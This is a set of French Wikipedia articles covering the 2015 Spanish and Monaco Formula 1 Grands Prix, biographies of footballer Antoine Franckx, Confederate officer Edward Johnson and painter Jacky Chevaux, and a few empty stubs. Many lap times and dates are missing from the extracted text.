La température ambiante est de 22 °C au départ de la dernière séance d'essais libres. Tous les pilotes s'élancent chaussés de pneus durs et Felipe Nasr, au volant de sa Sauber C34, fixe le temps de référence en .
Daniel Ricciardo, qui peut enfin prendre part à l'intégralité d'une session d'essais (au contraire de son coéquipier Daniil Kvyat qui ne peut rouler que pour les vingt dernières minutes), améliore par deux fois ( puis ) avant de céder le commandement à Kimi Räikkönen ().
Peu avant la mi-séance, Ricciardo chausse le premier les pneus tendres et prend la tête en . Lewis Hamilton part en tête-à-queue à haute vitesse au virage (où Fernando Alonso a été accidenté durant les essais hivernaux) ; il récupère "in-extremis" sa monoplace et évite une sortie de piste. Quelques instants plus tard, toujours chaussé des pneus durs, il améliore la performance de Ricciardo, en . Dans la foulée, son coéquipier Nico Rosberg, lui aussi en pneus durs, se place en tête en .
Dans les dernières minutes de la séance, tous les pilotes chaussent les pneus tendres pour préparer la qualification de l'après-midi. Valtteri Bottas améliore en puis cède le commandement à Sebastian Vettel () et à Nico Rosberg () qui établit le meilleur temps de la matinée.
Séances de qualifications.
Résultats des qualifications.
Session Q1.
Il fait beau et chaud au départ de la première phase qualificative du Grand Prix d'Espagne. À l'ouverture de la piste, seul Roberto Merhi s'élance, les autres pilotes attendant que les conditions de piste s'améliorent. Au volant de sa Marussia MR03B, Merhi fixe le temps de référence en . 
Nico Hülkenberg améliore en puis s'incline face au régional de l'étape, Carlos Sainz Jr., qui tourne en . Nico Rosberg, malgré une petite erreur dans le virage , améliore dès son premier tour lancé, en ; son coéquipier Lewis Hamilton, tout en se plaignant du manque d'adhérence, fait encore mieux, en . 
Les McLaren MP4-30 de Jenson Button et Fernando Alonso ne prennent la piste qu'à huit minutes de la fin et se hissent aux cinquième et sixième rangs. Alors que certains pilotes se relancent avec les gommes les plus tendres proposées par Pirelli, Hamilton, resté en pneus durs, tourne en , devançant son coéquipier Rosberg, lui aussi en pneus durs, et Kimi Räikkönen. Les Manor Marussia pointent logiquement en fond de classement, accompagnées dans la zone d'élimination par la Red Bull RB11 de Daniil Kvyat (en difficulté lors le la dernière session d'essais libres) et les par les deux Lotus E23 Hybrid de Pastor Maldonado et Romain Grosjean. 
En toute fin de séance, Kvyat, Grosjean et Maldonado parviennent à s'extraire de la zone rouge ; les cinq pilotes éliminés sont Marcus Ericsson, les deux pilotes Force India, Sergio Pérez et Nico Hülkenberg (rentré au stand prématurément), et les deux Marussia de Roberto Merhi et Will Stevens. En tête du classement, Hamilton et Rosberg précèdent Räikkönen et Sainz ; suivent les deux Williams FW37 de Valtteri Bottas et Felipe Massa, Maldonado et Grosjean, Max Verstappen et, à la dixième place, Sebastian Vettel.
Session Q2.
Il faut attendre plusieurs minutes après l'ouverture de la piste pour que Felipe Nasr sorte enfin, et fixe le temps de référence en . Lewis Hamilton, qui chausse pour la première fois ses pneus tendres boucle son premier tour lancé en . Nico Rosberg, lui aussi désormais en pneus tendres, fait encore mieux que son équipier, en . À l'issue de leur première tentative, les pilotes Ferrari ne sont pas loin derrière les mercedes tandis que les deux Lotus, les deux McLaren et la Sauber de Nasr sont dans la zone éliminatoire. 
Dans les deux dernières minutes de la séance, tous les pilotes hormis les cinq premiers (Rosberg, Hamilton, Kimi Räikkönen, Sebastian Vettel et Valtteri Bottas) se relancent pour tenter d'améliorer leurs performances. La hiérarchie ne change pourtant pas puisque Romain Grosjean et son coéquipier Pastor Maldonado, Fernando Alonso et son coéquipier Jenson Button, et Felipe Nasr sont éliminés.
Session Q3.
On retrouve, parmi les dix protagonistes à la pole position, les pilotes Mercedes Grand Prix, Scuderia Ferrari, Red Bull Racing, Scuderia Toro Rosso et Williams F1 Team. À l'issue de la première tentative, Nico Rosberg, en , devance de quelques dixièmes de seconde son coéquipier Lewis Hamilton () ; suivent Sebastian Vettel, Valtteri Bottas, Kimi Räikkönen et Max Verstappen (Felipe Massa, Carlos Sainz Jr., Daniel Ricciardo et Daniil Kvyat restent dans leur stand, misant leur qualification sur une seule tentative.
Les pilotes se relancent dans les derniers instants mais personne ne bat le temps de Nico Rosberg qui réalise la seizième pole position de sa carrière, sa première cette saison. Lewis Hamilton l'accompagne en première ligne. Vettel et Bottas occupent la deuxième ligne et les pilotes Toro Roos la suivante (Sainz devant Verstappen) ; suivent Räikkönen, Kvyat, Massa et Ricciardo.
Course.
Déroulement de l'épreuve.
Il fait beau et chaud au départ, avec 27 °C dans l'air et une piste à 49 °C. Nico Rosberg est en pole position pour la première fois de la saison, devant son coéquipier Lewis Hamilton. L'ensemble des pilotes s'élancent avec les pneus les plus tendres proposés par Pirelli. À l'extinction des feux, Rosberg prend un envol parfait, au contraire d'Hamilton sur le côté sale de la piste, dépassé par Sebastian Vettel dès le premier virage. Plus loin derrière, Romain Grosjean se hisse en neuvième position (il est ensuite dépassé par son équipier Pastor Maldonado puis par Daniel Ricciardo). Kimi Räikkönen passe les deux Scuderia Toro Rosso de Carlos Sainz Jr. et Max Verstappen (Felipe Massa ne tardera pas à faire de même). Au premier passage sur la ligne de chronométrage, Rosberg devance Vettel, Hamilton, Valtteri Bottas, Räikkönen, Verstappen, Sainz, Massa, Grosjean, Ricciardo, Maldonado, Fernando Alonso et Daniil Kvyat.
Rosberg creuse immédiatement l'écart sur Vettel qui retient Hamilton derrière lui ; au quatrième tour, plus de deux secondes séparent la Mercedes et la Ferrari. Lewis Hamilton tente à chaque tour de passer Vettel grâce à son aileron arrière mobile mais ne parvient, à chaque fois, qu'à abîmer un peu plus ses pneus tendres. Mercedes décide alors de modifier sa stratégie de course en passant de deux à trois arrêts, et d'anticiper son premier passage aux stands. Lorsque Maldonado dépasse Verstappen, le volet vertical droit de l'aileron arrière de la Lotus E23 Hybrid (abîmé après que Romain Grosjean l'a percuté un peu plus tôt) cède ; si le Vénézuélien semble un temps pouvoir poursuivre sa course, il ne cesse de chuter au classement et finit par abandonner dans le quarante-sixième tour.
Kvyat et Jenson Button s'arrêtent les premiers pour changer leurs pneus, au douzième tour ; Felipe Nasr les imite au suivant puis, comme convenu, Hamilton s'arrête tôt, au quatorzième tour. Un problème de fixation du pneu arrière-droit lui fait perdre un temps précieux et risque de nuire à sa nouvelle stratégie de course. Ricciardo, Verstappen, Vettel, Massa et Sainz rentrent dans les deux tours suivants ; Rosberg, Bottas, Grosjean et Maldonado au seizième tour (les mécaniciens tentent une réparation de fortune de son aileron arrière) et Räikkönen au dix-huitième tour (le Finlandais ressort chaussé de pneus durs : il opte donc pour une stratégie décalée par rapport à ses concurrents directs). À l'issue de la vague d'arrêts, Rosberg conserve la tête de la course avec un avantage de 6 secondes sur Vettel et de 7 secondes sur Hamilton ; suivent Bottas à 15 secondes et Räikkönen à 20 secondes. Comme lors du relais précédent, Hamilton se retrouve bloqué dans les échappements de la Ferrari de Vettel et aucune de ses attaques n'aboutit. Nico Rosberg se contente de gérer son avantage sans forcer son rythme.
Après 25 tours, un premier peloton constitué des deux Mercedes, des deux Ferrari et des deux Williams a définitivement pris le large sur les autres concurrents. Fernando Alonso, seizième, victime d'un problème de freins sur sa McLaren MP4-30 rentre au stand au vingt-huitième tour et, peinant à s'arrêter, manque de renverser un de ses mécaniciens ; il abandonne dans la foulée. En tête, Nico Rosberg porte l'écart sur Sebastian Vettel à huit secondes puis, au fil des tours, à dix secondes et enfin à quinze secondes. Au trente-troisième tour, à la mi-course, Hamilton s'arrête et ressort en pneus durs : sa stratégie à trois arrêts lui permet de passer aisément Räikkönen avant de fondre sur Bottas et de le doubler avec l'aide de l'aileron arrière mobile au bout de la ligne droite. Entretemps, Kvyat stoppe dans le quarantième tour, Vettel, Nasr et Grosjean au suivant (arrêt très long car Le Français rate son emplacement en freinant trop tard et renverse un de ses mécaniciens), Räikkönen au quarante-deuxième, Bottas au suivant ; Maldonado, Rosberg et Massa s'arrêtent parmi les derniers. Lewis Hamilton est désormais en tête devant Nico Rosberg et Sebastian Vettel mais doit faire un arrêt supplémentaire.
Au cinquantième tour, Hamilton devance Rosberg de 2 secondes, Vettel de 23 s, Bottas de 34 s et Räikkönen de 40 s ; suivent Massa, Ricciardo, Grosjean, Kvyat et Verstappen. Lewis Hamilton effectue son dernier arrêt deux tours plus tard et ressort deuxième, devant Sebastian Vettel. Nico Rosberg remporte sa première victoire de la cette saison, Hamilton assure un nouveau doublé à son écurie tandis que Vettel monte sur son quatrième podium en cinq courses ; suivent pour les points Bottas, Räikkönen, Massa, Ricciardo, Grosjean et Sainz qui a ravi la neuvième place à Kvyat dans l'avant-dernier tour.
Pole position et record du tour.
Nico Rosberg part en pole position pour la seizième fois de sa carrière, la première fois de la saison et la deuxième fois à Barcelone. 
Statistiques.
Le Grand Prix d'Espagne 2015 représente :
Au cours de ce Grand Prix :

</doc>
<doc id="8980238" url="https://fr.wikipedia.org/wiki?curid=8980238" title="Teira perspicillata chabanaudi">
Teira perspicillata chabanaudi



</doc>
<doc id="8980239" url="https://fr.wikipedia.org/wiki?curid=8980239" title="Teira perspicillata pellegrini">
Teira perspicillata pellegrini



</doc>
<doc id="8980240" url="https://fr.wikipedia.org/wiki?curid=8980240" title="Jose Vicente Toribio Alcolea">
Jose Vicente Toribio Alcolea



</doc>
<doc id="8980241" url="https://fr.wikipedia.org/wiki?curid=8980241" title="Teira perspicillata perspicillata">
Teira perspicillata perspicillata



</doc>
<doc id="8980242" url="https://fr.wikipedia.org/wiki?curid=8980242" title="Jose Vicente Toribio">
Jose Vicente Toribio



</doc>
<doc id="8980243" url="https://fr.wikipedia.org/wiki?curid=8980243" title="Julian David Arredondo Moreno">
Julian David Arredondo Moreno



</doc>
<doc id="8980244" url="https://fr.wikipedia.org/wiki?curid=8980244" title="Antoine Franckx">
Antoine Franckx

Antoine "Toon" Franckx, né le à Lierre en Belgique et mort le dans la même ville, est un footballeur international belge qui joue au poste d'attaquant de pointe.
Il passe l'essentiel de sa carrière au Lyra, club avec lequel il dispute une finale de Coupe de Belgique.
Biographie.
Antoine Franckx débute en équipe première du Turn- en Sportvereniging Lyra, un des deux clubs de sa ville natale, en 1925 à l'âge de seize ans. L'équipe évolue alors en Promotion, le second niveau national. L'équipe remporte le titre de champion en 1932 et accède ainsi pour la première fois à la Division d'Honneur.
Pour sa première saison au plus haut niveau national, Antoine Franckx inscrit treize buts en 23 rencontres. Il dispute également la finale de la Coupe de Belgique 1934-1935, perdue 3-2 face au Daring Club de Bruxelles. Un an plus tard, il est sélectionné à deux reprises en équipe nationale belge pour disputer les deux rencontres amicales contre l'Angleterre et la Suisse. Il joue les deux matches en intégralité sans inscrire de buts et ne sera plus jamais appelé par la suite. Lors de son premier match, il délivre la passe décisive pour Jean Fievez qui inscrit le but victorieux à six minutes de la fin du match. Il s'agit encore aujourd'hui de la seule victoire belge sur l'Angleterre.
La saison 1936-1937 est la dernière d'Antoine Franckx au Lyra. Il inscrit douze buts en 22 matches puis quitte le club pour rejoindre l'Olympic de Charleroi, promu parmi l'élite nationale. Il ne reste qu'une saison chez les « "Dogues" » et part ensuite pour le RCS Schaerbeek, qui joue au deuxième niveau national. Son séjour est perturbé par la Seconde Guerre mondiale, rendant l'organisation des compétitions difficile. Il décide de prendre sa retraite de joueur au terme de la saison 1945-1946

</doc>
<doc id="8980247" url="https://fr.wikipedia.org/wiki?curid=8980247" title="Liste des conseillers généraux des Alpes-de-Haute-Provence">
Liste des conseillers généraux des Alpes-de-Haute-Provence



</doc>
<doc id="8980251" url="https://fr.wikipedia.org/wiki?curid=8980251" title="Edward Johnson (militaire)">
Edward Johnson (militaire)

Edward « Allegheny » Johnson, né le à Midlothian et mort le à Richmond, est un officier de carrière de l'armée des États-Unis et officier de l'armée des États confédérés pendant la guerre de Sécession.
Avant la guerre.
Edward Johnson sort diplômé de West Point en 1854
Guerre de Sécession.
Bien considéré par Robert Lee, il est nommé commandant de division sous Richard Stoddert Ewell. Le premier soir de la bataille de Gettysburg (), Ewell rate l'occasion d'attaquer « Cemetery Hill » et Johnson choisi également de ne pas attaquer la « » pour laquelle il a une ordonnance discrétionnaire. Johnson attaque les deuxième et troisième jours de la bataille, trop tardivement. Ewell et Johnson sont alors accusés d'avoir manquer l'occasion et donc d'avoir participé à la perte de cette bataille décisive.
Le 12 mai 1864 au cours de la bataille de Spotsylvania Court House, la division nordiste du major-général Birney, en première ligne avec celle de Barlow, profite de l'obscurité et du brouillard pour s'approcher silencieusement des ouvrages confédérés. Lancée dans une charge à la baïonnette rapide et surprenante, elle perce les lignes sudistes, entraînant la capture d'une division entière, y compris le major-général Edward Johnson et le brigadier-général G. H. Steuart.
Postérité.
Il est enterré au Hollywood Cemetery.

</doc>
<doc id="8980252" url="https://fr.wikipedia.org/wiki?curid=8980252" title="Grand Prix automobile de Monaco 2015">
Grand Prix automobile de Monaco 2015

Le Grand Prix automobile de Monaco 2015 (Formula 1 Grand Prix de Monaco 2015), disputé le sur le circuit de Monaco, est la du championnat du monde de Formule 1 courue depuis 1950. Il s'agit de la soixante-deuxième édition du Grand Prix de Monaco comptant pour le championnat du monde de Formule 1 et de la sixième manche du championnat 2015.
Pour la première fois de sa carrière, Lewis Hamilton part en pole position à Monaco. Cette cinquième pole position en six courses cette saison est sa quarante-troisième depuis ses débuts en Formule 1. Il se montre le plus rapide lors de ses deux tentatives dans la troisième phase des qualifications, alors que son coéquipier Nico Rosberg, finalement relégué à 342 millièmes de seconde, a perdu toutes ses chances de lui contester la première place sur la grille en bloquant ses roues dans le virage de Sainte-Dévote. Derrière les deux Flèches d'argent, Sebastian Vettel est, à nouveau, le rival le plus dangereux, à 751 millièmes de Hamilton. Il est accompagné, en deuxième ligne, de Daniel Ricciardo tandis que Daniil Kvyat devance Kimi Räikkönen sur la troisième ligne.
Au terme des soixante-dix-huit tours de la course, Nico Rosberg obtient la dixième victoire de sa carrière en remportant son troisième succès consécutif à Monaco où il a grandi, et, pour la première fois depuis ses débuts en Formule 1, s'adjuge deux victoires à la suite après s'être imposé, le , en Espagne. Il doit toutefois son succès à une erreur stratégique reconnue par son écurie qui a pénalisé son coéquipier Lewis Hamilton : alors que ce dernier fait cavalier seul en tête depuis son départ en pole position, Max Verstappen percute violemment Romain Grosjean au freinage de Sainte-Dévote, et provoque la sortie de la voiture de sécurité au soixante-cinquième tour. Hamilton est rappelé aux stands pour chausser sa W06 de pneus tendres tandis que Rosberg et Sebastian Vettel, qui roulent vingt-cinq secondes derrière, restent en piste. Le champion du monde 2014 ressort de la voie stands de justesse derrière eux, et achève la course à la troisième place. Vettel évite donc un doublé des Flèches d'Argent. Daniil Kvyat, qui a cédé sur consigne d'équipe sa quatrième place à son coéquipier Daniel Ricciardo, la récupère dans le dernier tour, et les deux Red Bull devancent la Ferrari SF15-T de Kimi Räikkönen suivi de Sergio Pérez. Jenson Button marque les quatre premiers points de la nouvelle association McLaren-Honda en terminant huitième devant Felipe Nasr et Carlos Sainz Jr.. Les dix premiers finissent dans le même tour, seulement séparés de 25 secondes à cause de la sortie de la voiture de sécurité durant huit tours en fin d'épreuve. 
Lewis Hamilton, toujours en tête du championnat du monde n'a plus que 10 points d'avance sur son coéquipier Rosberg (126 points contre 116) et devance toujours les pilotes Ferrari, Sebastian Vettel (98 points) et Kimi Räikkönen (60 points). Valtteri Bottas (42 points) et son coéquipier Felipe Massa (39 points), qui n'ont pas marqué à Monaco, suivent. Daniel Ricciardo (35 points) précède désormais son coéquipier Daniil Kvyat (17 points) et Felipe Nasr (16 points) qui ont relégué Romain Grosjean au dixième rang (16 points). Mercedes conserve la tête du championnat, avec 242 points, devant Ferrari (158 points) et Williams (81 points) ; suivent Red Bull Racing (52 points), Sauber (21 points), Force India (17 points), Lotus (16 points), Scuderia Toro Rosso (15 points) et McLaren qui, grâce à Jenson Button, inscrit ses 4 premiers points de la saison. Manor Marussia n'a pas encore inscrit de point.
Essais libres.
Première séance, le jeudi de 10 h à 11 h 30.
La première séance d'essais libres du Grand Prix de Monaco débute sur une piste légèrement humide. Tous les pilotes s'élancent en pneus intermédiaires pour leur tour d'installation. La plupart des écuries testent de nouveaux kits aérodynamiques tels un nouvel aileron avant chargé de ' sur la Red Bull RB11, un aileron arrière de type ' épousant la sortie d'échappement sur la Mercedes AMG F1 W06 Hybrid ou encore une amélioration générale de l'avant de la Toro Rosso STR10. Lewis Hamilton fixe le temps de référence en .
Quelques minutes plus tard, Hamilton reprend la piste avec un train de pneus pour piste sèche (le train supplémentaire de pneus prévu pour la première demi-heure de la première séance) et améliore à trois reprises (, et ). Dans le même temps, son équipier Nico Rosberg frotte le rail et doit rentrer pour faire contrôler sa monoplace. Lewis Hamilton tourne un peu plus tard en puis Rosberg, au volant d'une monoplace révisée, passe en tête en ; Hamilton réplique aussitôt, en , loin devant les autres concurrents puisque le troisième, Kimi Räikkönen évolue en .
Peu après la mi-séance, Lewis Hamilton reprend la piste et boucle un tour en . Sebastian Vettel se hisse à la deuxième place, en , et devance Nico Rosberg, en . Après 43 minutes, Jenson Button, le seul pilote à ne pas encore avoir réalisé le moindre tour chronométré, prend la piste au volant de sa McLaren MP4-30. La fin de séance voit Lewis Hamilton rester en tête du classement tandis que Max Verstappen, dans les ultimes instants, accède à la deuxième place, en suivi par Daniel Ricciardo, en ; Vettel, s'il a également amélioré son temps () est désormais quatrième, devant Carlos Sainz Jr. et Pastor Maldonado sur sa Lotus E23 Hybrid.
Deuxième séance, le jeudi de 14 h à 15 h 30.
La deuxième séance d'essais libres commence sur une piste sèche ; Marcus Ericsson n'y prend pas part à cause de problèmes techniques sur sa Sauber C34. Nico Rosberg, le premier à s'élancer, bloquant ses roues à Mirabeau (Pastor Maldonado et Sebastian Vettel feront de même), Kimi Räikkönen établit le temps de référence en .
Dans la foulée, son coéquipier Vettel améliore, en , mais ne peut résister ni Carlos Sainz Jr. ( puis ), ni à Daniil Kvyat (). Les pilotes Mercedes ne tardent pas à rétablir la hiérarchie en vigueur depuis le début de saison puisque Rosberg tourne en et Lewis Hamilton en puis . Vettel améliore, en 1 min 18 s 295, et se poste au troisième rang, derrière les deux Flèches d'argent. 
Après un quart d'heure, Roberto Merhi perd le contrôle de sa Marussia MR03 au freinage à la sortie du tunnel et tape le muret dans la chicane. La séance est interrompue par un drapeau rouge. Alors que les commissaires de piste évacuent la monoplace, la pluie fait son apparition. À la relance, alors que la pluie est devenue plus drue, Pastor Maldonado conserve ses pneus pour le sec mais renonce à boucler un tour lancé ; les autres pilotes restent ainsi tous dans leur stand pendant un long moment. 
Dans les dix dernières minutes, Fernando Alonso, Daniel Ricciardo et Daniil Kvyat tentent une sortie en pneus intermédiaires et tournent une bonne vingtaine de secondes moins vite qu'en début de séance. Les deux meilleurs temps reviennent donc à Hamilton et Rosberg qui devancent les deux Ferrari de Vettel et Räikkönen ; Kvyat est cinquième devant les deux Toro Rosso de Sainz et max Verstappen et la McLaren d'Alonso.
Troisième séance libre, le samedi de 11 h à 12 h.
Il fait beau et la température ambiante est de 18 °C au départ de la dernière séance d'essais libres. Une minute après le début de la session, quinze pilotes sont déjà en piste, chaussés pour la plupart avec le mélange le plus tendre de l'ensemble de la gamme proposée par Pirelli. Sergio Pérez établit le temps de référence en .
Dans le premier quart d'heure, Lewis Hamilton enchaîne quatre tours lancés sans commettre la moindre erreur et améliore à chaque reprise ; il prend donc la tête en , , et enfin . Son coéquipier Nico Rosberg évolue pour sa part en . Les Ferrari SF15-T semblent en mesure de rivaliser avec les deux Mercedes, puisque Kimi Räikkönen, en pointe au troisième rang devant son coéquipier Sebastian Vettel. Après vingt-huit minutes, le Finlandais part alors à la faute à Sainte Dévote et touche le rail avec l'arrière de sa monoplace, provoquant une interruption de la séance drapeau rouge (Max Verstappen, en survirage, cassera la moitié de son aileron arrière contre le muret du dernier virage un peu plus tard, sans provoquer une seconde neutralisation). La Ferrari est si endommagée au niveau de sa suspension arrière gauche qu'elle ne peut être ramenée au stand ; les mécaniciens devront donc travailler d'arrache-pied pour permettre à Räikkönen de participer aux qualifications au volant d'une monoplace performante. 
À la relance quelques instants plus tard, tous les pilotes se prennent la piste avec les pneus les plus tendres. Nico Rosberg, en améliore son meilleur temps mais ne parvient pas à passer devant son équipier, toujours en tête du classement. Confirmant le potentiel déjà entrevu de sa monoplace, Sebastian Vettel réalise, en fin de séance, le meilleur temps, en ; il se fait, dans la foulée une grosse frayeur en manquant de percuter une Force India dans le virage de la Rascasse dans son tour de décélération.
Séances de qualifications.
Résultats des qualifications.
Session Q1.
La première phase de la séance qualificative commence sur une piste sèche et sous une température ambiante de 19 °C. Les pilotes s'élancent dès l'ouverture de la piste et Max Verstappen établit le premier tour chronométré en ; il améliore sur sa lancée, en . 
Sebastian Vettel passe en tête en mais ne parvient pas à contrer les Mercedes puisque Lewis Hamilton améliore en deux temps ( puis ) tandis que Nico Rosberg réalise d'ores et déjà ce qui restera le meilleur temps de la session, en . Il faut patienter de longues minutes pour voir les Williams FW36 et les McLaren MP4-30 effectuer leurs premiers tours lancés. 
Nico Hülkenberg tape le muret dans le virage de Mirabeau mais parvient à regagner les stands. Carlos Sainz Jr. se retrouve sous investigation des commissaires de course pour avoir gêné Fernando Alonso dans le virage de la Rascasse tandis que pour Valtteri Bottas, qui n'a jamais brillé à Monaco, la séance est très difficile. Si plusieurs pilotes remontent en piste chaussés des pneus les plus tendres de Pirelli, aucun ne menace la performance de Rosberg qui reste en tête devant son coéquipier. Derrière, la hiérarchie est totalement modifiée puisque Vettel est repoussé à la neuvième place après les améliorations de Verstappen (), Daniil Kvyat (), Carlos Sainz Jr. (l'Espagnol, qui tournait en , a omis de passer au pesage et écope d'une pénalité), Daniel Ricciardo (), Sergio Pérez () et l'inattendu Jenson Button ().
L'accident de Kimi Räikkönen, durant la matinée, qui lui a fait craindre un changement de boîte de vitesses après les dégâts constatés au niveau de l'arrière de sa monoplace n'a eu pour conséquence que de donner plus de travail à son équipe de mécaniciens. Ceux-ci pensent qu'un méplat sur le pneu a provoqué son accident, thèse rejetée par Pirelli. Les cinq pilotes éliminés sont Will Stevens et son coéquipier Roberto Merhi, Marcus Ericsson et son coéquipier Felipe Nasr et Valtteri Bottas qui a tourné dans un temps plus proche de celui des modestes Marussia MR03 que des Mercedes de tête.
Session Q2.
Tous les pilotes se relancent chaussés des pneus les plus tendres proposés par Pirelli (les Mercedes et les Ferrari étaient les seules monoplaces à ne pas avoir utilisé ce type de pneumatiques lors de la session Q1). Sebastian Vettel établit le temps de référence en . 
Après seulement cinq minutes, le drapeau jaune est déployé dans Sainte Devote à cause d'un problème mécanique sur la McLaren de Fernando Alonso, contraint de s'immobiliser définitivement. Sergio Pérez se porte en tête en mais est ensuite battu par Daniel Ricciardo (), Vettel () et Rosberg (, meilleur temps de la session), qui fait un « tout-droit » dans le premier virage en fin de séance, sans conséquence. Son coéquipier Lewis Hamilton, gêné par l'équilibre de ses pressions de pneu, lui concède 7 dixièmes de seconde.
Les deux Toro Rosso STR10 se montrent toujours aussi véloces sur ce type de tracé et dominent leurs « consœurs », Red Bull RB11 qui évoluent à la limite de la zone éliminatoire. Pour la première fois cette saison, Pastor Maldonado se qualifie devant son coéquipier Romain Grosjean ; il accède en phase Q3 tandis que sont éliminés Fernando Alonso et son coéquipier Jenson Button, Felipe Massa (qui, comme son équipier plus tôt, n'a pas réussi à faire correctement chauffer ses pneumatiques), Nico Hülkenberg et Romain Grosjean.
Session Q3.
Les pilotes s'élancent immédiatement en piste alors que la température se rafraichit et que les premières gouttes de pluie font leur apparition au-dessus du paddock. Sergio Pérez réalise le premier temps chronométré, en , immédiatement amélioré par Lewis Hamilton, en . À l'issue de leur première tentative, tous les pilotes rentrent chausser de nouvelles gommes pour un second essai. Hamilton devance Nico Rosberg de 136 millièmes de seconde ; suivent Sebastian Vettel à une seconde, Daniel Ricciardo et son coéquipier Daniil Kvyat, Pérez, Max Verstappen et son coéquipier Carlos Sainz Jr., Kimi Räikkönen et Pastor Maldonado.
Après quelques instants, Nico Rosberg reprend la piste ; il comprend dès son premier secteur qu'il n'améliorera pas sa performance après un gros blocage de roues dans Sainte Dévote et rompt son effort. Lewis Hamilton, quant à lui, réalise la pole position, en . Il partage la première ligne avec son coéquipier tandis que suivent Vettel et Ricciardo en deuxième ligne, Kvyat et Räikkönen, Pérez et Sainz et enfin Maldonado et Verstappen.
Course.
Déroulement de l'épreuve.
Il fait un peu plus chaud que durant le reste du weekend sur la grille de départ avec 19 °C dans l'air et 37 °C degrés sur la piste sous un temps est ensoleillé. Dix-neuf pilotes s'alignent sur la grille car Carlos Sainz Jr., exclu des qualifications pour ne pas s'être présenté au pesage, doit partir après le peloton, depuis la voie des stands. Lewis Hamilton s'élance depuis la pole position pour la première fois en Principauté, accompagné en première ligne par Nico Rosberg et devant Sebastian Vettel et Daniel Ricciardo. Les dix pilotes de tête ont chaussé les pneus les plus tendres alors que Fernando Alonso et Valtteri Bottas, qui avaient le choix de leurs pneumatiques, ont opté pour les gommes plus dures. À l'extinction des feux, Hamilton prend le meilleur envol tandis que Rosberg conserve "in-extremis" l'avantage sur Vettel, directement menacé par Ricciardo et Daniil Kvyat. Plus loin, Felipe Massa, victime d'un problème mécanique de sa Williams FW36 doit couper son effort et repasser par les stands. Au virage de Mirabeau, Fernando Alonso percute Nico Hülkenberg ; l'Allemand doit rentrer faire changer son aileron avant tandis que l'Espagnol poursuit sa route en attendant de purger une pénalité de 5 secondes d'arrêt supplémentaire lors de son prochain passage au stand. Au premier passage sur la ligne de chronométrage, Hamilton devance Rosberg, Vettel, Kvyat, Ricciardo, Kimi Räikkönen, Sergio Pérez, Maldonado, Verstappen, Jenson Button, Alonso, Nasr et Grosjean. 
Après cinq tours, Hamilton a creusé un écart supérieur à deux secondes sur Rosberg qui précède d'autant Vettel. Pastor Maldonado, victime de problèmes de freins, est dépassé par Max Verstappen, puis abandonne dès le sixième tour. Sainz, qui évolue en fond de classement, rentre pour chausser de nouveaux pneus dès le treizième tour. Bottas et Marcus Ericsson, eux aussi distancés, rentrent au quinzième tour : ils adoptent une stratégie décalée dans l'espoir de remonter au classement. Romain Grosjean, dans la même situation, s'arrête au dix-huitième tour, imité par Felipe Nasr au suivant. Après vingt boucles, Hamilton précède toujours Rosberg, Vettel, Kvyat et Ricciardo. Avant même le cap des trente premiers tours, les pilotes de tête sont gênés par le peloton des retardataires et Rosberg perd encore plus de temps sur son coéquipier. Derrière, alors que Kvyat s'arrête au vingt-neuvième tour, la lutte s'intensifie entre Ricciardo et Räikkönen pour le gain de la quatrième place. Verstappen s'arrête très longtemps au tour suivant, imité par Hülkenberg, Alonso qui purge sa pénalité, Button, Vettel (qui ressort en pneus durs), Ricciardo, Pérez, Rosberg, Räikkönen et Hamilton entre les trente-deuxième et trente-neuvième tour. Les mécaniciens Ferrari, plus rapides que leurs homologues de Red Bull Racing permettent à Räikkönen de ressortir devant Ricciardo. Au quarantième tour, après cette vague d'arrêts, Hamilton possède 8 secondes d'avance sur Rosberg, 10 s sur Vettel et 21 s sur Kvyat ; suivent Räikkönen, Ricciardo, Pérez, Button, Alonso et Nasr.
Fernando Alonso abandonne dans le quarante-troisième tour à cause d'un problème de boîte de vitesses. Max Verstappen, s'arrête pour la seconde fois au quarante-septième tour tandis qu'Hamilton porte son avance à plus de dix secondes ; elle atteint même les vingt secondes peu après le soixantième tour. Au soixante-quatrième tour, grâce à ses pneus plus frais, Verstappen talonne Romain Grosjean mais freine trop tard au bout de la ligne droite des stands et casse sa suspension avant-gauche sur la Lotus E23 Hybrid du Français avant de taper violemment le mur de pneus à Sainte Dévote (il sera pénalisé d'un recul sur la grille de départ du prochain Grand Prix pour conduite dangereuse). La voiture de sécurité virtuelle est déployée pour la première fois en Formule 1, le temps que la vraie prenne la piste. Alors qu'il ne reste plus que douze tours à couvrir, Hamilton se met d'accord par radio avec son stand pour rentrer chausser un nouveau train de pneus. Pendant que le leader de la course s'exécute, le duo Rosberg-Vettel en profite pour passer en tête de la course (Vettel devance Hamilton de moins d'une longueur lorsqu'il rejoint la piste à la sortie de la voie des stands). Ainsi, derrière la voiture de sécurité, Rosberg devance Vettel, Hamilton, Kvyat, Räikkönen, Ricciardo, Pérez, Button, Nasr et Sainz.
L'épreuve est relancée à l'entame du soixante-et-onzième tour. Lewis Hamilton, qui comprend que la course est quasiment jouée, se montre très agressif avec ses pneus supertendres ; alors qu'il fait tout son possible pour essayer de dépasser Vettel, Rosberg, en tête de la course, file vers une victoire inespérée (il était en effet à 25 secondes de son coéquipier avant l'intervention de la voiture de sécurité). Daniil Kvyat laisse passer son coéquipier Ricciardo, plus rapide avec ses pneus neufs, afin qu'il tente d'atteindre le podium ; l'Australien n'y parvenant pas lui rend la quatrième place en ralentissant fortement à quelques hectomètres l'arrivée. Nico Rosberg s'impose pour la troisième fois de suite en Principauté et obtient, pour la première fois de sa carrière en Formule 1, un deuxième succès consécutif. Sebastian Vettel termine deuxième devant Lewis Hamilton ; suivent pour les points Kvyat, Ricciardo, Räikkönen, Pérez, Button (qui ouvre le compteur de son écurie Mclaren-Honda), Nasr et Sainz.
Après la fin de l'épreuve, Toto Wolff présente ses excuses à Hamilton et déclare : tandis que Niki Lauda parle d'une .
Statistiques.
Le Grand Prix de Monaco 2015 représente :
Au cours de ce Grand Prix :

</doc>
<doc id="8980253" url="https://fr.wikipedia.org/wiki?curid=8980253" title="Allegheny Johnson">
Allegheny Johnson



</doc>
<doc id="8980258" url="https://fr.wikipedia.org/wiki?curid=8980258" title="Jacky Chevaux">
Jacky Chevaux

Jacky Chevaux, de son vrai nom Jean-Jacques Chevaux, né le à Badevel (Doubs), et mort le à Mulhouse, est un peintre, graveur, illustrateur et caricaturiste français.
Biographie.
Jacky Chevaux étudie à l'École supérieure d'art de Mulhouse de 1956 à 1962, où il enseigne par la suite la peinture et le dessin de 1978 à 1990 ou 1991.
